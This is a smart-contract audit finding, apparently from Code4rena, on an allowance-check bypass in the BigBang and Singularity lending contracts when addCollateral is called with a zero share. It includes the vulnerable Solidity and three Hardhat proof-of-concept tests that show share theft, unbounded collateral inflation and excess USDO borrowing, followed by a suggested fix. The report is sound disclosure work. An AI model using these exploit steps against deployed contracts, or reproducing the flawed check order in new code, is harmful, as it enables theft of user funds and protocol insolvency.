---
id: 19062
severity: "High"
---

# Ability to steal user funds and increase collateral share infinitely in BigBang and Singularity

## Description

The `addCollateral` methods in both BigBang and Singularity contracts allow the share parameter to be passed as `0`. When `share` is `0`, the equivalent amount of shares is calculated using the YieldBox `toShare` method. However, there is a modifier named `allowedBorrow` that is intended to check the allowed borrowing amount for each implementation of the `addCollateral` methods. Unfortunately, the modifier is called with the `share` value passed to `addCollateral`, and in the case of `0`, it will always pass.

```solidity
// MarketERC20.sol
function _allowedBorrow(address from, uint share) internal {
    if (from != msg.sender) {
        if (allowanceBorrow[from][msg.sender] < share) {
            revert NotApproved(from, msg.sender);
        }
        allowanceBorrow[from][msg.sender] -= share;
    }
}

// BigBang.sol
function addCollateral(
    address from,
    address to,
    bool skim,
    uint256 amount,
    uint256 share
    // @audit share is calculated afterwords the modifier
) public allowedBorrow(from, share) notPaused {
    _addCollateral(from, to, skim, amount, share);
}

function _addCollateral(
    address from,
    address to,
    bool skim,
    uint256 amount,
    uint256 share
) internal {
    if (share == 0) {
        share = yieldBox.toShare(collateralId, amount, false);
    }
    userCollateralShare[to] += share;
    uint256 oldTotalCollateralShare = totalCollateralShare;
    totalCollateralShare = oldTotalCollateralShare + share;
    _addTokens(
        from,
        to,
        collateralId,
        share,
        oldTotalCollateralShare,
        skim
    );
    emit LogAddCollateral(skim ? address(yieldBox) : from, to, share);
}
```

This leads to various critical scenarios in BigBang and Singularity markets where user assets can be stolen, and collateral share can be increased infinitely which in turn leads to infinite USDO borrow/mint and borrowing max assets from Singularity market.

Refer to Proof of Concept for attack examples

## Proof of Concept

1. Malicious actor can add any user shares that were approved to BigBang or Singularity contracts deployed. This way adversary is stealing user shares that he can unwrap to get underlying collateral provided.

```solidity
it('allows steal other user YieldBox collateral shares', async () => {
    const {
        wethBigBangMarket,
        weth,
        wethAssetId,
        yieldBox,
        deployer: userA,
        eoa1: userB,
    } = await loadFixture(register);

    await weth.approve(yieldBox.address, ethers.constants.MaxUint256);
    await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);

    const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
        10,
    );
    await weth.freeMint(wethMintVal);
    const valShare = await yieldBox.toShare(
        wethAssetId,
        wethMintVal,
        false,
    );

    // User A deposit assets to yieldbox, receives shares
    await yieldBox.depositAsset(
        wethAssetId,
        userA.address,
        userA.address,
        0,
        valShare,
    );
    let userABalance = await yieldBox.balanceOf(
        userA.address,
        wethAssetId,
    )
    expect(userABalance.gt(0)).to.be.true;
    expect(userABalance.eq(valShare)).to.be.true;

    // User B adds collateral to big bang from user A shares
    await expect(wethBigBangMarket.connect(userB).addCollateral(
        userA.address,
        userB.address,
        false,
        wethMintVal,
        0,
    )).to.emit(yieldBox, "TransferSingle")
        .withArgs(wethBigBangMarket.address, userA.address, wethBigBangMarket.address, wethAssetId, valShare);

    userABalance = await yieldBox.balanceOf(
        userA.address,
        wethAssetId,
    )
    expect(userABalance.eq(0)).to.be.true;

    let collateralShares = await wethBigBangMarket.userCollateralShare(
        userB.address,
    );
    expect(collateralShares.gt(0)).to.be.true;
    expect(collateralShares.eq(valShare)).to.be.true;

    // User B removes collateral
    await wethBigBangMarket.connect(userB).removeCollateral(
        userB.address,
        userB.address,
        collateralShares,
    );

    collateralShares = await wethBigBangMarket.connect(userB).userCollateralShare(
        userA.address,
    );
    expect(collateralShares.eq(0)).to.be.true;

    // User B ends up with User A shares in yieldbox
    let userBBalance = await yieldBox.balanceOf(
        userB.address,
        wethAssetId,
    )
    expect(userBBalance.gt(0)).to.be.true;
    expect(userBBalance.eq(valShare)).to.be.true;
});
```

2. For Singularity contract this allows to increase collateralShare by the amount of assets provided as collateral infinitely leading to `x / x + 1` share of the collateral for the caller with no shares in the pool, where x is the number of times the `addColateral` is called, effectively allowing for infinite borrowing. As a consequence, the attacker can continuously increase their share of the collateral without limits, leading to potentially excessive borrowing of assets from the Singularity market.

```solidity
it('allows to infinitely increase user collateral share in BigBang', async () => {
    const {
        wethBigBangMarket,
        weth,
        wethAssetId,
        yieldBox,
        deployer: userA,
        eoa1: userB,
    } = await loadFixture(register);

    await weth.approve(yieldBox.address, ethers.constants.MaxUint256);
    await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);

    const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
        10,
    );
    await weth.freeMint(wethMintVal);
    const valShare = await yieldBox.toShare(
        wethAssetId,
        wethMintVal,
        false,
    );

    // User A deposit assets to yieldbox, receives shares
    await yieldBox.depositAsset(
        wethAssetId,
        userA.address,
        userA.address,
        0,
        valShare,
    );
    let userABalance = await yieldBox.balanceOf(
        userA.address,
        wethAssetId,
    )
    expect(userABalance.gt(0)).to.be.true;
    expect(userABalance.eq(valShare)).to.be.true;

    // User A adds collateral to BigBang
    await wethBigBangMarket.addCollateral(
        userA.address,
        userA.address,
        false,
        wethMintVal,
        0,
    );
    let bigBangBalance = await yieldBox.balanceOf(
        wethBigBangMarket.address,
        wethAssetId,
    )
    expect(bigBangBalance.eq(valShare)).to.be.true;
    let userACollateralShare = await wethBigBangMarket.userCollateralShare(
        userA.address,
    );
    expect(userACollateralShare.gt(0)).to.be.true;
    expect(userACollateralShare.eq(valShare)).to.be.true;
    let userBCollateralShare = await wethBigBangMarket.userCollateralShare(
        userB.address,
    );
    expect(userBCollateralShare.eq(0)).to.be.true;

    // User B is able to increase his share to 50% of the whole collateral added
    await expect(wethBigBangMarket.connect(userB).addCollateral(
        wethBigBangMarket.address,
        userB.address,
        false,
        wethMintVal,
        0,
    )).to.emit(yieldBox, "TransferSingle")

    userBCollateralShare = await wethBigBangMarket.userCollateralShare(
        userB.address,
    );

    expect(userBCollateralShare.gt(0)).to.be.true;
    expect(userBCollateralShare.eq(valShare)).to.be.true;

    // User B is able to increase his share to 66% of the whole collateral added
    await expect(wethBigBangMarket.connect(userB).addCollateral(
        wethBigBangMarket.address,
        userB.address,
        false,
        wethMintVal,
        0,
    )).to.emit(yieldBox, "TransferSingle")

    userBCollateralShare = await wethBigBangMarket.userCollateralShare(
        userB.address,
    );

    expect(userBCollateralShare.gt(0)).to.be.true;
    expect(userBCollateralShare.eq(valShare.mul(2))).to.be.true;

    // ....
});
```

3. In the BigBang contract, this vulnerability allows a user to infinitely increase their collateral shares by providing collateral repeatedly. As a result, the user can artificially inflate their collateral shares provided, potentially leading to an excessive borrowing capacity. By continuously adding collateral without limitations, the user can effectively borrow against any collateral amount they desire, which poses a significant risk to USDO market.

```solidity
it('allows infinite borrow of USDO', async () => {
    const {
        wethBigBangMarket,
        weth,
        wethAssetId,
        yieldBox,
        deployer: userA,
        eoa1: userB,
    } = await loadFixture(register);

    await weth.approve(yieldBox.address, ethers.constants.MaxUint256);
    await yieldBox.setApprovalForAll(wethBigBangMarket.address, true);

    const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(
        10,
    );
    await weth.freeMint(wethMintVal);
    const valShare = await yieldBox.toShare(
        wethAssetId,
        wethMintVal,
        false,
    );

    // User A deposit assets to yieldbox, receives shares
    await yieldBox.depositAsset(
        wethAssetId,
        userA.address,
        userA.address,
        0,
        valShare,
    );
    let userABalance = await yieldBox.balanceOf(
        userA.address,
        wethAssetId,
    )
    expect(userABalance.gt(0)).to.be.true;
    expect(userABalance.eq(valShare)).to.be.true;

    // User A adds collateral to BigBang
    await wethBigBangMarket.addCollateral(
        userA.address,
        userA.address,
        false,
        wethMintVal,
        0,
    );
    let bigBangBalance = await yieldBox.balanceOf(
        wethBigBangMarket.address,
        wethAssetId,
    )
    expect(bigBangBalance.eq(valShare)).to.be.true;
    let userACollateralShare = await wethBigBangMarket.userCollateralShare(
        userA.address,
    );
    expect(userACollateralShare.gt(0)).to.be.true;
    expect(userACollateralShare.eq(valShare)).to.be.true;

    await wethBigBangMarket.borrow(userA.address, userA.address, "7450000000000000000000");

    await expect(
        wethBigBangMarket.borrow(userA.address, userA.address, "7450000000000000000000")
    ).to.be.reverted;

    await expect(wethBigBangMarket.addCollateral(
        wethBigBangMarket.address,
        userA.address,
        false,
        wethMintVal,
        0,
    )).to.emit(yieldBox, "TransferSingle")

    await wethBigBangMarket.borrow(userA.address, userA.address, "7500000000000000000000");

    await expect(wethBigBangMarket.addCollateral(
        wethBigBangMarket.address,
        userA.address,
        false,
        wethMintVal,
        0,
    )).to.emit(yieldBox, "TransferSingle")

    await wethBigBangMarket.borrow(userA.address, userA.address, "7530000000000000000000");

    // ....
});
```

## Recommendation

* Check allowed to borrow shares amount after evaluating equivalent them

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the addCollateral functions of the BigBang and Singularity market contracts. These functions accept a share parameter that represents the amount of YieldBox shares to be locked as collateral. When a caller passes a value of zero for share, the function defers the calculation of the actual share amount to an internal routine that calls YieldBox.toShare after the allowedBorrow modifier has already executed. The allowedBorrow modifier is intended to enforce that the caller is authorized to borrow a specific number of shares, but because it receives the original share argument (zero), the check always succeeds and no allowance is deducted. Consequently, an attacker who has been granted approval to move another user’s YieldBox assets (via setApprovalForAll or allowanceBorrow) can invoke addCollateral with share set to zero, causing the contract to transfer the victim’s shares to the attacker’s address while the internal accounting records the attacker’s collateral share as if they had supplied the assets themselves. This flaw enables two distinct attack vectors: (1) direct theft of another user’s YieldBox shares by adding collateral on their behalf, resulting in the victim’s balance dropping to zero and the attacker receiving the underlying collateral; (2) repeated calls with share equal to zero allow the attacker to inflate their own collateral share without bound because each call adds newly calculated shares to the totalCollateralShare while the allowedBorrow check never limits the amount. The inflated share grants the attacker proportionally larger borrowing power, ultimately permitting unlimited minting of USDO or borrowing of assets from the Singularity market. The issue manifests whenever the addCollateral function is called with a zero share and the caller possesses the necessary token approvals. It affects any user who has approved the market contract to manage their YieldBox assets, as well as the protocol itself, which can become insolvent due to uncontrolled borrowing capacity. The bug was discovered during a formal audit by Code4rena, where test cases demonstrated that a malicious actor could steal shares and increase collateral share indefinitely. The problem is subtle because the share parameter appears optional and the conversion to actual shares happens after the security‑critical modifier, giving a false sense of protection. Detecting the flaw requires tracing the order of operations and understanding that the modifier validates the pre‑conversion value rather than the effective share amount. To remediate, the contract should compute the share amount before invoking allowedBorrow, or move the allowedBorrow check to occur after the toShare conversion, and additionally enforce that share cannot be zero when the caller is not the owner. A more robust solution is to validate that the caller either supplies a non‑zero share or that the calculated share matches the authorized allowance, thereby preventing unauthorized transfer of shares and unbounded collateral inflation.
